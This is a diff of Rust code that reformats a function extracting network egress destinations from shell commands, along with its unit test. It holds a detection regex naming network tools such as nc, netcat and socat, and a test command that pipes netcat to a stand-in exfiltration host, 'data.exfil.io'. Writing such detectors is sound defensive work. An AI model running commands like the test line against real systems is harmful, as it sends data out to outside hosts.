@@ -129,7 +129,10 @@ fn extract_destinations(command: &str) -> Vec<EgressDestination> {
             r"(?i)\b(fetch|nc|ncat|netcat|ftp|sftp|socat|httpie|xh)\b[^\n]*?\b((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})\b"
         ).unwrap()
     });
-    let already_seen: HashSet<String> = destinations.iter().map(|d| d.domain.to_lowercase()).collect();
+    let already_seen: HashSet<String> = destinations
+        .iter()
+        .map(|d| d.domain.to_lowercase())
+        .collect();
     for cap in generic_net_cmd_re.captures_iter(command) {
         let domain = cap[2].to_string();
         if !already_seen.contains(&domain) {
@@ -379,8 +382,9 @@ mod tests {
     #[test]
     fn test_generic_network_catchall() {
         let dests = extract_destinations("nc data.exfil.io 9999");
-        assert!(dests.iter().any(|d| d.kind == "generic_network"
-            && d.domain == "data.exfil.io"));
+        assert!(dests
+            .iter()
+            .any(|d| d.kind == "generic_network" && d.domain == "data.exfil.io"));
 
         let dests = extract_destinations("curl https://example.com/api/data");
         assert!(!dests.iter().any(|d| d.kind == "generic_network"));
